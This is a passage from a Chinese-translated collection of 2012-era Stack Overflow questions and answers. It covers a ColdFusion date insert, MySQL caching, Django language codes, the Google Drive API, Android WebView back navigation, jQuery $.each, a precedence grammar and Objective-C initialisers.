                 um_gs_dnrcnt_cfm_pg_pp)                    
    VALUES('#um_gs_fyr#',                                    
                '#um_gs_inst#',                                 
                '#um_gs_dept#',                                 
    #um_gs_dt_of_record#,    <---- this is date datatype, 
                                   I suspect this may be the problem?          
                '#um_gs_fund_type#',                            
                '#um_gs_dnr_type#',                             
    #um_gs_amt_cash#,                                        
                    #um_gs_dnrcnt_cash#,                         
                    #um_gs_amt_pl#,                              
                    #um_gs_dnrcnt_pl#,                           
                    #um_gs_amt_pp#,                              
                    #um_gs_dnrcnt_pp#,                           
                    #um_gs_amt_pp_prior#,                        
                    #um_gs_dnrcnt_pp_prior#,                     
                    #um_gs_amt_gik#,                             
                    #um_gs_dnrcnt_gik#,                          
                    #um_gs_amt_pg_cash#,                         
                    #um_gs_dnrcnt_pg_cash#,                      
                    #um_gs_amt_pg_pl#,                           
                    #um_gs_dnrcnt_pg_pl#,                        
                    #um_gs_amt_pg_pp#,                           
                    #um_gs_dnrcnt_pg_pp#,                        
                    #um_gs_amt_gft_mtch#,                        
                    #um_gs_dnrcnt_gft_mtch#,                     

         #um_gs_amt_cfm_pp#,                               

         #um_gs_dnrcnt_cfm_pp#,                            
                    #um_gs_amt_cfm_pg_pp#,                       
    #um_gs_dnrcnt_cfm_pg_pp#)                                
    </cfquery>                                             
</cfoutput> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-04T13:27:28.497

这部分没有正确地用单引号括起来。

```
AA', 1995-01-31 00:00:00.0, '1' 
```

**编辑（基于注释）** 如果单引号不能修复它，那么您可以在`to_date()`函数中显式声明日期格式

# mysql - MySQL 表缓存

> ID：12264362
> 
> 赞同：0
> 
> 时间：2012-09-04T13:19:29.777
> 
> 标签：mysql, caching, optimization

我对此有点陌生，所以我需要了解缓存的工作原理。

我正在做一些分析工作，所以我只对某个日期时间之间的数据感兴趣。我必须在不同的列上执行`count()`, `max()`（`avg()`相同数据范围的总共 20 个奇数查询）。

我想优化我的查询，以便`'SELECT * FROM table WHERE date BETWEEN startdate AND enddate'`缓存表并对该数据执行后续查询。

我可以做某事并保存处理，否则它会自动发生？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-04T13:25:34.177

假设您有足够的专用于 MySQL 的内存来保存数据，这应该会自动发生。建立一个索引`startdate`并且`enddate`也将是至关重要的。

此外，请记住，您可以在单个查询中拥有多个聚合函数 - 因此，如果它们都在相同的日期范围内，您可以执行少于 20 个查询来获取所需的数据。

# django - 将语言代码映射到 Django LANGUAGES 中的条目

> ID：12264368
> 
> 赞同：1
> 
> 时间：2012-09-04T13:19:50.717
> 
> 标签：django, localization, translation

我有一个 Django 项目。它有一个`settings.LANGUAGES`看起来有点像下面的：

```
LANGUAGES = (
    ('de', 'German'),
    ('en', 'English'),
    ('en-us', 'US English'),
) 
```

我有一系列语言代码，对于它们中的每一个，都`django.utils.translation.check_for_language()`返回`True`，即项目支持它们：

```
language_codes = ('en', 'en-us', 'en-gb', 'de', 'de-at') 
```

我想进行转换`language_codes`，使每个项目都是 中的一种语言`LANGUAGES`，即：

```
transformed_language_codes = ('en', 'en-us', 'en', 'de', 'de') 
```

我想 Django 在寻找翻译时会进行类似的转换。但是，仔细查看`django.utils.translation.trans_real`并没有发现任何看起来正确的东西。我最好的选择似乎是修改一些东西`get_language_from_request()`以使用相同的子字符串逻辑，或者自己编写一些东西并调试分裂的边缘情况。

我是否错过了一些有用的功能来做到这一点，还是我需要自己编写？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-09-24T16:59:54.373

我想出了这个：

```
class UnknownLanguageError(Exception):
    pass

def translate_languages(lang_codes, supported_languages):
    translated_languages = []
    for code in lang_codes: 
        if not code in supported_languages: 
            code = code[:2]
            if not code in supported_languages:
                raise UnknownLanguageError()
        translated_languages.append(code)

    return zip(lang_codes, translated_languages)

if __name__ == '__main__':
    LANGUAGES = (
        ('de', 'German'),
        ('en', 'English'),
        ('en-us', 'US English'),
    )
    lang_codes = ('en', 'en-us', 'en-gb', 'de', 'de-at')
    lang_table = translate_languages(lang_codes, dict(LANGUAGES).keys())
    for t in lang_table:
        print '%s \t -> %s' % (t[0], t[1]) 
```

# google-drive-api - 如何通过新的 google drive api 列出“与我共享”的项目？

> ID：12264370
> 
> 赞同：7
> 
> 时间：2012-09-04T13:19:54.363
> 
> 标签：google-drive-api

当我通过网络查看时，“与我共享”文件夹中有四个文件：file1、file2、file3、fil4。我不拥有它们（我只能写/读）。我尝试使用带有参数 q = 'not (myId) in owner' 的 file.list 方法来获取它们。之后，结果仅包含四个 file1 中的一项。当我执行 q = 'not (myId) in owner' 和 title = 'file2' 之后，结果只包含一个项目 file2。有人可以告诉我为什么吗？或者如何以其他方式列出它们？

更新。一段时间后`"q = not 'me' in owner"`返回空数组（。下面的结果`"q = not 'me' in owners and title = 'File Name'"`

```
{
 "kind": "drive#fileList",
 "etag": "\"dTUgP0s1WO8T7wOSfuvve0A4d_k/7dZrNXLata7h1mdbx2RHkqdePEM\"",
 "selfLink": "https://www.googleapis.com/drive/v2/files?q=not+'me'+in+owners+and+title+%3D+'File+Name'",
 "items": [
  {

   "kind": "drive#file",
   "id": "1L8lfBYZHV59uUVpFspFdeW4SaJB7eo3CgPe59kpNCmY",
   "etag": "\"dTUgP0s1WO8T7wOSfuvve0A4d_k/MTM0MjE4MDUzNjUyNg\"",
   "selfLink": "https://www.googleapis.com/drive/v2/files/1L8lfBYZHV59uUVpFspFdeW4SaJB7eo3CgPe59kpNCmY",
   "alternateLink": "https://docs.google.com/a/readdle.com/document/d/1L8lfBYZHV59uUVpFspFdeW4SaJB7eo3CgPe59kpNCmY/edit",
   "embedLink": "https://docs.google.com/a/readdle.com/document/d/1L8lfBYZHV59uUVpFspFdeW4Sa5JB7eo3CgPe59kpNCmY/preview",
   "thumbnailLink": "https://docs.google.com/feeds/vt?gd=true&id=1L8lfBYZHV59uUVpFspFdeW4SaJB7eo3CgPe59kpNCmY&v=270&s=AMedNnoAAAAAUE-eryR5NIqdEWR3A7bza730sDHhziBH&sz=s220",
   "title": "File Name",
   "mimeType": "application/vnd.google-apps.document",
   "labels": {
    "starred": false,
    "hidden": false,
    "trashed": false,
    "restricted": false,
    "viewed": true
   },
   "createdDate": "2012-03-19T08:37:26.636Z",
   "modifiedDate": "2012-07-13T11:55:36.526Z",
   "modifiedByMeDate": "2012-05-11T13:02:10.901Z",
   "lastViewedByMeDate": "2012-09-04T14:44:32.193Z",
   "sharedWithMeDate": "2012-05-11T10:15:44.221Z",
   "parents": [
   ],
   "exportLinks": {
    "application/vnd.oasis.opendocument.text": "https://docs.google.com/feeds/download/documents/export/Export?id=1L8lfBYZHV59uUVpFspFdeW4SaJB7eo3CgPe59kpNCmY&exportFormat=odt",
    "application/msword": "https://docs.google.com/feeds/download/documents/export/Export?id=1L8lfBYZHV59uUVpFspFdeW4SaJB7eo3CgPe59kpNCmY&exportFormat=doc",
    "text/html": "https://docs.google.com/feeds/download/documents/export/Export?id=1L8lfBYZHV59uUVpFspFdeW4SaJB7eo3CgPe59kpNCmY&exportFormat=html",
    "application/rtf": "https://docs.google.com/feeds/download/documents/export/Export?id=1L8lfBYZHV59uUVpFspFdeW4SaJB7eo3CgPe59kpNCmY&exportFormat=rtf",
    "text/plain": "https://docs.google.com/feeds/download/documents/export/Export?id=1L8lfBYZHV59uUVpFspFdeW4SaJB7eo3CgPe59kpNCmY&exportFormat=txt",
    "application/pdf": "https://docs.google.com/feeds/download/documents/export/Export?id=1L8lfBYZHV59uUVpFspFdeW4SaJB7eo3CgPe59kpNCmY&exportFormat=pdf"
   },
   "userPermission": {
    "kind": "drive#permission",
    "etag": "\"dTUgP0s1WO8T7wOSfuvve0A4d_k/b2rD7cIZxsGVuxg2MbXoc17PSQU\"",
    "id": "me",
    "selfLink": "https://www.googleapis.com/drive/v2/files/1L8lfBYZHV59uUVpFspFdeW4SaJB7eo3CgPe59kpNCmY/permissions/me",
    "role": "writer",
    "type": "user"
   },
   "quotaBytesUsed": "0",
   "ownerNames": [
    "Owner Name"
   ],
   "lastModifyingUserName": "Owner Name",
   "editable": true,
   "writersCanShare": true
  }
 ]
} 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-02-19T09:00:34.803

q=sharedWithMe 还应该返回所有与您共享的文件列表。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-06T08:50:35.730

这是一个技巧问题吗？:-)

“当我做 q = 'not (myId) in owner'**和 title = 'file2'**之后，结果只包含一个项目**file2**。”

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-04T14:31:04.560

这并不完全正确，您创建了文件并不意味着您不是所有者。所有者权限可能已为您添加到文件中。

查询应该有效：

```
q=not 'user@example.org' in owners 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-28T08:27:35.070

看起来现在一切都很好。我可以在所有者中看到所有与我共享的文件，其中 q = not 'me'。所以答案是“google 用他们的 google drive api 做了一些工作”）

感谢所有帮助我理解这一点的人

# sql - SQL DB2 存储过程基于其他列添加列的排列

> ID：12264371
> 
> 赞同：0
> 
> 时间：2012-09-04T13:19:55.797
> 
> 标签：sql, database, stored-procedures, db2, permutation

给定下表：

```
tableA:        | tableB:
               |
col1  col2     | col3  col4
-----------    | ----------
1     4        | 1     x
2     5        | 2     x
3     6        | 1     z
               | 2     z
               | 3     z 
```

我想在 DB2 中编写一个存储过程，通过修改 col3 的值及其从`tableA`(1-4, 2-5, 3-6) 的映射，在 tableB 中添加一些行，因此添加了这些行：

通过查看行 where `col4 = x`，这些行必须添加到 tableB 中：

```
 | 4     A1 -> (only 1 changed to its mapping value 4)
               | 2     A1

               | 1     B1   
               | 5     B1 -> (only 2 changed to its mapping value 5)

               | 4     C1 -> (1 changed to its mapping value 4)
               | 5     C1 -> (and 2 changed to its mapping value 5) 
```

并通过查看行 where `col4 = z`，这些行必须添加到 tableB 中：

```
 | 4     A2 -> (only 1 changed to its mapping value 4)
               | 2     A2
               | 3     A2

               | 1     B2 
               | 5     B2 -> (only 2 changed to its mapping value 5)
               | 3     B2

               | 1     C2 
               | 2     C2
               | 6     C2 -> (only 3 changed to its mapping value 6)

               | 4     D2 -> (1 changed to its mapping value 4)
               | 5     D2 -> (and 2 changed to its mapping value 5)
               | 3     D2

               | 4     E2 -> (1 changed to its mapping value 4)
               | 2     E2
               | 6     E2 -> (and 3 changed to its mapping value 6)

               | 1     F2 
               | 5     F2 -> (2 changed to its mapping value 5)
               | 6     F2 -> (and 3 changed to its mapping value 6)

               | 4     G2 -> (1 changed to its mapping value 4)
               | 5     G2 -> (and 2 changed to its mapping value 5)
               | 6     G2 -> (and 3 changed to its mapping value 6) 
```

请注意，在我的示例中，我有：

*   2 对 1 映射（由 2 行表示：[1,x] 和 [2,x]），因此在 tableB 中添加了 3 多行。
*   和一个 3 对 1 的映射（由 3 行表示：[1,z]、[2,z] 和 [3,z]），因此在 tableB 中添加了 7 多行。

如果我在 tableB 中有 4 对 1 映射（由 4 行表示），则必须再添加 15 行。
如果我在 tableB 中有 5 对 1 映射（由 5 行表示），则必须再添加 31 行，依此类推...

（不要将这些映射与 tableA 的映射混淆。是不同的）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-04T13:24:11.977

我很难理解。

我认为最好删除每个子集，然后插入当前映射。（而不是试图找出增量）

这似乎是不这样非规范化的一个很好的理由。

# objective-c - 为什么我的 UIView 在动画上会失真？

> ID：12264373
> 
> 赞同：2
> 
> 时间：2012-09-04T13:20:11.200
> 
> 标签：objective-c, ios5, animation, objective-c-blocks, uiswipegesturerecognizer

我正在开发一个 iPad 应用程序，它使用滑动手势在日历上的月份之间移动。动画风格很好，应用程序在我的动画前后显示正确的屏幕。但是，在动画过程中，有两个问题：

- 原始视图被扭曲或模糊。
- 在动画期间，原始月份（9 月）显示在“下一页”而不是下个月（10 月）。

我有一份工作要截取这个截图，但如果你看一下动画镜头的左上角，你会发现问题。看起来所有的文字都变成了粗体。这是图像，然后是代码。

动画前：

[动画前 http://i1219.photobucket.com/albums/dd427/Dave_Chambers/1-2.png](http://i1219.photobucket.com/albums/dd427/Dave_Chambers/1-2.png)

动画期间：

![动画期间](../Images/51b4e8a5d0d1d9fe7bab36eb9a223ce8.png)

如果您查看左上角的“K-SUPER...”，您会发现由于动画造成的失真，文字较粗。

动画结束后：

![动画结束后](../Images/cee097a494754c7081bd540dfc8044bf.png)

任何人都知道我该如何解决这个问题，所以我看到之前的九月，动画期间的十月和之后的十月？

编码：

```
 - (void)swipedInLeftDirection:(UISwipeGestureRecognizer *)sender {
NSLog(@"UserActions: %s", __PRETTY_FUNCTION__);

[MonthlyEventView animateWithDuration:1.0
                 animations:^{
                         [MonthlyEventView setAnimationTransition: UIViewAnimationTransitionCurlUp forView:self cache:NO];
                 }
                 completion:^(BOOL finished) {

                     NSDateComponents* plusOneMonth = [[NSDateComponents alloc] init];
                     [plusOneMonth setMonth:1];
                     NSDate* oneMonthForward = [[NSCalendar currentCalendar] dateByAddingComponents:plusOneMonth toDate:self.selectedDate options:0];
                     [self.delegate monthlyView:self userDidPerformSwipeInDirection:UISwipeGestureRecognizerDirectionLeft andExpectingDateToBeSelected:oneMonthForward];

                 }];

} 
```

对于它的价值，视图大小是 704 x 569。也许这很重要，我不知道。

提前感谢任何解决方案。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-04T15:47:17.623

您的文本失真是由于在几乎完全相同的位置绘制标签，*几乎*是由于动画，产生了一种粗体效果。最简单的解决方案是让您的日历视图不透明。`[UIColor lightGrayColor]`即为整个视图设置背景颜色。这也可以使卷曲页面的背面显示为纯灰色，就像人们期望的灰色纸一样。

还有关于为什么旧月出现在动画下方。过渡的机制`UIView`本质上是捕获视图的当前外观，然后在动画之后渲染它应该看起来的样子，然后将原始捕获的动画移出屏幕。*在所有这些*发生后调用完成块。所以基本上你从你所处的状态动画到你所处的状态，然后将日历设置为一个新的日期。所以听起来很奇怪，设置日历的日期是动画的一部分。

还有一个更直接的基于块的 API。

```
[UIView transitionWithView:self // since this code is in the view's implementation.
                  duration:0.8
                   options:UIViewAnimationOptionTransitionCurlUp
                animations:^{
                    NSDateComponents* plusOneMonth = [[NSDateComponents alloc] init];
                    [plusOneMonth setMonth:1];
                    NSDate* oneMonthForward = [[NSCalendar currentCalendar] dateByAddingComponents:plusOneMonth toDate:self.selectedDate options:0];
                    [self.delegate monthlyView:self userDidPerformSwipeInDirection:UISwipeGestureRecognizerDirectionLeft andExpectingDateToBeSelected:oneMonthForward];
                }
                completion:^(BOOL b){
                    // If you need notification when the animation completes put a callback here.
                }]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-04T15:41:58.500

用这个替换你的动画代码，然后再试一次：

```
[UIView animateWithDuration:1.0 delay:0 options:UIViewAnimationTransitionCurlUp animations:^{
    monthlyEventView.center = CGPointMake(<#CGFloat x#>, <#CGFloat y#>);//set center, frame or bounds
} completion:^(BOOL finished) {

    NSDateComponents* plusOneMonth = [[NSDateComponents alloc] init];
    [plusOneMonth setMonth:1];
    NSDate* oneMonthForward = [[NSCalendar currentCalendar] dateByAddingComponents:plusOneMonth toDate:self.selectedDate options:0];
    [self.delegate monthlyView:self userDidPerformSwipeInDirection:UISwipeGestureRecognizerDirectionLeft andExpectingDateToBeSelected:oneMonthForward];
}]; 
```

# java - 如何将旧数据删除到 ArrayList 中？

> ID：12264375
> 
> 赞同：0
> 
> 时间：2012-09-04T13:20:13.883
> 
> 标签：java

在我的代码中有

```
SearchBean sb=new SearchBean();
final static ArrayList<SearchBean> result=new ArrayList<SearchBean>();
public void addData()
{
.
.   (Adding data from data base into SearchBean object
.
result.add(sb);
}
public ArrayList<SearchBean> sendResult()
{
  return result;
} 
```

现在我是`return result`。第一次它给出正确但第二次该对象也将被添加。例如第一次搜索结果`syam`（正确结果）第二次搜索实际上`Ram`是正确的结果，但`syam,Ram`也来了......请帮助我......

```
how to remove old data into ArrayList? 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-04T13:22:10.960

使其成为局部变量而不是`static`字段。

通常，使用局部变量而不是字段是一个好主意，但在您的情况下，它会修复一个错误。;)

* * *

我会有类似的方法

```
addDataAndSendSearch(); // List is only in this method. 
```

或者

```
List<SearchBean> list = generateSearch();
sendSearch(list); 
```

或者

```
List<SearchBean> list = new ArrayList<>();
match1.addData(list);
match2.addData(list);
sendSearch(list); 
```

在每种情况下，您都可以看到

*   我不会重复使用全球或其他方面的列表。
*   该列表被传递给任何需要它的方法。没有机会获得旧值。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-04T13:36:12.103

因为一旦你添加了一些东西，`ArrayList`它就会保留在那里，除非你打电话`remove()`或`clear()`

# ios - 如何在同一部 iPhone 中获取两个不同版本的可执行文件？使用 Xcode

> ID：12264382
> 
> 赞同：-1
> 
> 时间：2012-09-04T13:20:49.340
> 
> 标签：ios, ios5, ios4, xcode4, xcode4.3

如果我的问题非常基本，请原谅。

我使用的是 Xcode 4.3.3，当我运行应用程序时，我得到了图标，底线是 HTH。现在我已经修复了代码中的某些内容，并希望在 iPhone 中运行，但我不希望 iPhone 中的先前可执行文件，即：HTH 也应该存在。为此，我必须在 Xcode 中进行哪些更改，以便在设备中获得更多可执行文件？

我尝试更改目标名称：

```
1\. single click in target name
2\. Close the Xcode, and restart, 
```

但它没有用。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-04T13:26:55.517

您必须更改捆绑标识符`info.plist`

# jquery - jQuery 每个回调

> ID：12264388
> 
> 赞同：16
> 
> 时间：2012-09-04T13:21:11.007
> 
> 标签：jquery, callback, each

如何在[jQuery 每个](http://api.jquery.com/jQuery.each/)函数上使用回调？

我正在尝试类似的东西：

```
$.each(images, function(key, value) { 
    new_images+= '<li><a href="'+value+'"><img src="'+value+'" alt="'+[key]+'" /></a></li>';
}, function (){
    $('#Gallery').remove();
    $('body').append('<ul class="gallery">'+new_images+'</ul>');
}); 
```

* * *

## 回答 #1

> 赞同：47
> 
> 时间：2012-09-04T13:27:19.433

`$.each();`是一个同步函数。这意味着您不需要内部回调函数，因为您编写的任何代码都将在结束后`$.each();`运行`$.each();`。

* * *

## 回答 #2

> 赞同：28
> 
> 时间：2012-09-04T13:24:09.510

这段代码有什么问题？您不需要回调`$.each`.

```
$.each(images, function(key, value) { 
    new_images+= '<li><a href="'+value+'"><img src="'+value+'" alt="'+[key]+'" /></a></li>';
});

$('#Gallery').remove();
$('body').append('<ul class="gallery">'+new_images+'</ul>'); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-04T13:23:54.893

你是这个意思吗？

```
$.each(images, function(key, value) { 
    new_images+= '<li><a href="'+value+'"><img src="'+value+'" alt="'+[key]+'" /></a></li>';
});
function myMethod(){
    $('#Gallery').remove();
    $('body').append('<ul class="gallery">'+new_images+'</ul>');
};
myMethod(); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-28T21:41:44.043

我现在有一个 .each-callback 的解决方案！

我必须为数组中的每个元素执行 ajax 请求。所以我制作了一个 div 容器，其中包含每个元素的所有 div 元素。每次加载时，div 元素在 .remove 之后变为绿色和 .slideUp。每次我问 div 容器是否为空时。如果是，我知道，所有元素都已完全加载（因为已删除）。

这是我的代码的一部分：

```
<script>
$(document).ready( function() {
    $.each(myChannels, function(index, value) {
        $("#tag_"+value).load('getxmls/ajaxrenewchannel/channel:'+value, function() {
            $("#tag_"+value).removeClass('alert-info').addClass('alert-success');
            $("#tag_"+value).slideUp('600', function () {
                $("#tag_"+value).remove();
                if( $('#loadcontainer').is(':empty') ) {
                    window.location = 'feeds/';
                }

                });

        });
    });
});
</script> 
```

希望这可以帮助那里的人...

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-04T13:25:19.510

不确定你的意思的回调。我想这就是你要找的

```
$('#Gallery').remove();
var selectItems='<ul class="gallery">';
$.each(images, function(key, value) { 
    selectItems+= '<li><a href="'+value+'">
                              <img src="'+value+'" alt="'+[key]+'" /></a></li>';    
});   
selectItems+= '</ul>';
$('body').append(selectItems); 
```

# xml - 将具有多个工作表的 Excel 2003 xml 文件导入 Microsoft Dynamics 2011

> ID：12264406
> 
> 赞同：2
> 
> 时间：2012-09-04T13:22:15.190
> 
> 标签：xml, excel, import, dynamics-crm

我正在尝试在 Dynamics CRM 中设置数据映射，这将允许我从具有多个工作表的 Microsoft Excel 2003 XML 文件中导入客户数据。每个实体信息（“帐户”和“客户”）都存储在单独的工作表中。我已将数据映射 xml 中的标记更改为“多个”，并为客户和帐户添加了实体映射，然后将其导入回 Dynamics。

但是，在执行导入时，CRM 软件只能查看第一个工作表上的内容，并尝试从这个数据集中获取客户和帐户数据。我试过四处寻找有类似问题的人，但这似乎不是一个常见的问题。

Excel 2003 XML 格式支持多个工作表。是否可以让导入过程处理这些多张工作表，还是根本不支持？我能够编辑数据映射文件或导入数据文件的 XML 代码，但我之前没有为 Dynamics 本身编写任何插件。您能给我的任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-04T13:40:36.393

这不可能。Dynamics CRM 仅读取第一个工作表上的数据。忽略任何其他工作表。最好的办法是为您需要上传的每个实体制作多个 XML 文件。这更有条理，如果出现问题，您的故障排除会容易得多。

# android - 片段内的WebView - 返回按钮？

> ID：12264409
> 
> 赞同：0
> 
> 时间：2012-09-04T13:22:25.263
> 
> 标签：android, webview

我创建了一个带有片段的小型 Android 4 应用程序。在所有这些片段中，我有一些 webviews，如果我单击不同的片段，我希望加载不同的网站。

我现在有`TabOne.java`；`TabTwo.java`; `TabThree.java`等等。

我也想知道：我可以在不需要 的情况下制作这个应用程序`TabOne.java`，`TabTwo.java`等等；仅来自`MainActivity.java`? 我的意思是，要有一个`WebView`，并且在单击不同的选项卡时，`WebView`会加载不同的 Url（根据所选选项卡）。如果这是不可能的，你能告诉我这里有什么问题吗（`TabOne.java`）：

```
@Override
public View onCreateView(LayoutInflater inflater, ViewGroup container,
        Bundle savedInstanceState)
{
    View view = inflater.inflate(R.layout.tabone, container, false);
    myWebView = (WebView) view.findViewById(R.id.webview);
    myWebView.getSettings().setPluginsEnabled(true);
    myWebView.loadUrl("http://m.stirileprotv.ro");
    myWebView = new WebView(getActivity());
    myWebView.setOnKeyListener(new OnKeyListener(){
            @Override
            public boolean onKey(View v, int keyCode, KeyEvent event) {
                  if ((keyCode == KeyEvent.KEYCODE_BACK) && myWebView.canGoBack())                              
            {
                        myWebView.goBack();
                        return true;
                    }
                    return false;
            }
    });
    myWebView.setWebViewClient(new WebViewClient() {
    @Override public boolean shouldOverrideUrlLoading(WebView view, String url) {
            if (Uri.parse(url).getHost().equals("m.stirileprotv.ro")) {
                myWebView.loadUrl(url);
                return true;
            }
            else
            {
                return false;
            }
         }
    });
    return view;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2018-05-11T13:47:39.320

这就是我所做的。

在片段中，将 webview 引用声明为 static-

```
public static WebView mWebView;

public WebFragment() {
    // Required empty public constructor
}

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
}

@Override
public View onCreateView(LayoutInflater inflater, ViewGroup container,
                         Bundle savedInstanceState) {

    View v=inflater.inflate(R.layout.fragment_web, container, false);
    mWebView = (WebView) v.findViewById(R.id.webview);
    mWebView.loadUrl("https://google.com");

    // Enable Javascript
    WebSettings webSettings = mWebView.getSettings();
    webSettings.setJavaScriptEnabled(true);

    // Force links and redirects to open in the WebView instead of in a         browser
    mWebView.setWebViewClient(new WebViewClient());

    return v;
}
public boolean canGoBack() {
    return mWebView.canGoBack();
}

public void goBack() {
    mWebView.goBack();
} 
```

}

现在，在父活动中 -

```
@Override
public void onBackPressed() {

    WebFragment fragment = new WebFragment();
    if (fragment.mWebView.canGoBack()) {
        fragment.mWebView.goBack();
    } else {
        super.onBackPressed();
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-05T23:18:42.170

我所做的是在活动中实现它，然后有一个公共静态，所以：

在主要活动中：

```
public class MainActivity extends FragmentActivity{
    public static WebView myWebView;
    ...

    @Override
    public void onBackPressed() {
        if (getSupportFragmentManager().findFragmentByTag("yourtag") != null) {
            if(myWebView.canGoBack())
                myWebView.goBack();
            else {
                super.onBackPressed();
            }
        }
        else
            super.onBackPressed();
    }
    ...
} 
```

并在片段中引用它：

```
MainActivity.myWebView = (WebView) getView().findViewById(R.id.webview); 
```

并确保在创建片段时添加标签

```
transaction.replace(R.id.yourfragid, newfragment, "yourtag"); 
```

# compiler-construction - 编译器：如何定义这个语法？

> ID：12264411
> 
> 赞同：2
> 
> 时间：2012-09-04T13:22:27.700
> 
> 标签：compiler-construction, compilation, computer-science, computer-architecture

我必须为我正在创建的一些编译器做一个语法：二元运算符`&&`和`||`一元运算符`#`，并且`*`以它们的方式：

I)`||`优先于`&&`
II)`&&`关联到左侧：a && b && c 表示 ((a&&b)&&c)
III)`||`关联到右侧
IV) 一元运算符具有相同的优先级并且比二元运算符更多

我在想这样的事情：

```
E -> E || T | E && T | T
T -> T # F | T * F
F -> (E) | Numbers
Numbers -> 0 | 1 | 2 | 3 | ... | 9 
```

会不会错？有任何想法吗 ？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-04T13:53:06.110

对于像这样的简单表达式，您总是可以从最低优先级开始。

所以你想要一堆`&&`ed 表达式，每一个都是`||`同样优先的一元运算符的 ed 表达式。

在写下来之前，先看看这两条规则：

```
E -> E + T 
```

和

```
E -> T + E 
```

第一条规则使`+`左关联，而第二条规则使其右关联（考虑一下）。所以你希望你`&&`的左联想和`||`右联想：

```
E -> E '&&' T | T         # left associative &&
T -> F '||' T | F         # right associative || 
```

一元运算符的规则相当简单：

```
F -> '#' F | '*' F | N    # apply unary operators without precedence from right to left 
```

最后，最先例是括号，就好像你有一个牢不可破的令牌。除了，在括号内你可以有*任何*表达式：

```
N -> '(' E ')' | number 
```

本身可以用`number`正则表达式来表达，比如`'[1-9][0-9]*'`

# java - 未检测到控制键

> ID：12264413
> 
> 赞同：1
> 
> 时间：2012-09-04T13:22:33.397
> 
> 标签：java, swing, jtextarea, keylistener, key-events

此关键事件不起作用。相同的代码正在工作，

```
VK_SPACE 
```

它不适用于控制

```
private void jTextArea1KeyPressed(java.awt.event.KeyEvent evt) {
    if ((evt.getKeyChar() == KeyEvent.VK_CONTROL)) {
        System.out.println("CONTROL IS PRESSED");
    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-04T13:27:01.307

有一种方法`java.awt.event.KeyEvent`只是为了您的目的-[`isControlDown()`](http://docs.oracle.com/javase/1.4.2/docs/api/java/awt/event/InputEvent.html#isControlDown%28%29)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-04T13:27:41.443

*   没有理由使用`KeyListener`或`KeyBindings`或`AWTEventDispatch`

*   使用[JTextComponents的](http://docs.oracle.com/javase/tutorial/uiswing/components/text.html)[DocumentListener](http://docs.oracle.com/javase/tutorial/uiswing/events/documentlistener.html)将事件从外部`JTextCompoent`

*   使用[DocumentFilter](http://docs.oracle.com/javase/7/docs/api/javax/swing/text/DocumentFilter.html)过滤[Document](http://docs.oracle.com/javase/7/docs/api/javax/swing/text/Document.html)

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-09-04T13:28:16.750

不要[`getKeyChar`](http://docs.oracle.com/javase/7/docs/api/java/awt/event/KeyEvent.html#getKeyChar%28%29)与这些`VK_`常量结合使用。改为使用[`getKeyCode`](http://docs.oracle.com/javase/7/docs/api/java/awt/event/KeyEvent.html#getKeyCode%28%29)。`getKeyChar`仅用于可打印键，这会导致在正常操作中打印字符。`getKeyCode`另一方面，它旨在为您提供`VK_`按下的键的代码（即常量），即使没有关联的字符（如 Ctrl 的情况）。

另请参阅[此答案](https://stackoverflow.com/a/11381679/1468366)。

# objective-c - 目标c初始化

> ID：12264416
> 
> 赞同：6
> 
> 时间：2012-09-04T13:22:40.683
> 
> 标签：objective-c, init

`init`对象分配后真的有必要调用吗？我的意思是：例如，在 Java 中，如果您不调用它（构造函数），无论如何都会调用它（默认构造函数）。在 Objective C 中，您可以创建一个替代构造函数（如 Java），而我看到最多的东西之一是`self = [super init]`. 我读过：[cocoawithlove 文章](http://cocoawithlove.com/2009/04/what-does-it-mean-when-you-assign-super.html)，但最后不清楚我们为什么要进行这样的分配`self = [super init]`。它只是说`[super init]`可以返回一个不同的对象，然后我们必须`self`用那个新对象替换 。这无法解释为什么我们首先要这样做。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-04T13:29:53.753

> 对象分配后真的有必要调用init吗？

是的，这是必要的。为了与 Java 进行比较，调用`[super init]`（或其他一些指定的初始化程序）有效地运行超类的构造函数。在 Java 中为您提供了这种机制，但在 Objective-C 中没有。所以它不像在 Java 中那样在 ObjC 中被隐式调用。在 ObjC 中，您必须显式调用超类的指定初始化程序之一。如果你不调用你的超类的初始化器，你的对象将不会被完全初始化。这可能不会导致任何副作用，或者可能会导致调用未定义行为的完全不可用的对象。

> 为什么我们应该做这样的赋值 self = [super init]。

对，`alloc`创建一个分配（内存归零）并设置指向类信息的指针`isa`，但是超类的初始化器允许超类与另一个可能更合适的交换实例。通常，您会避免在自己的子类中这样做。执行此操作和 nil 检查的另一个原因是它是处理错误的方法。在 ObjC 中，异常一般是不可恢复的，因此向子类报告错误的常规方式是 return `nil`。这就是为什么不仅分配`self`，而且测试它也很重要`nil`。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-04T13:34:50.717

